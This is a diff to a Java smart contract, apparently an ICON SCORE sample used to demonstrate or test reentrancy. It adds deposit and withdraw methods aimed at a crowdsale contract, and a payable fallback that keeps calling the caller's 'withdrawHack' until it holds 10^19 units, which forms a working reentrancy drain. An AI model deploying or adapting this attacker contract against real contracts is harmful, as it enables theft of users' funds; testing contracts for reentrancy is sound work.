@@ -9,6 +9,7 @@ import score.BranchDB;
 import score.annotation.EventLog;
 import score.annotation.External;
 import score.annotation.Optional;
+import score.annotation.Payable;
 import java.util.Map;
 
 import java.math.BigInteger;
@@ -33,6 +34,35 @@ public class SampleContract implements ISampleContract {
     @External(readonly=true)
     public Address readMethod2() {
         return address;
+    }
+
+    /*
+     * Receives irc2 token
+     */
+    @External
+    public void tokenFallback(Address _from, BigInteger _value, byte[] _data) {
+        return;
+    }
+
+    @External
+    public void deposit(Address _crowdsale, BigInteger _amount) {
+        Context.transfer(_crowdsale, _amount);
+    }
+
+    @External
+    public void withdraw(Address _crowdsale) {
+        Context.call(_crowdsale, "withdrawHack");
+    }
+
+    @Payable
+    public void fallback() {
+        Address _from = Context.getCaller();
+        Address contractAddress = Context.getAddress();
+        BigInteger balance = Context.getBalance(contractAddress);
+
+        if (balance.compareTo(new BigInteger("10000000000000000000")) < 0) {
+            Context.call(_from, "withdrawHack");
+        }
     }
 
     @External
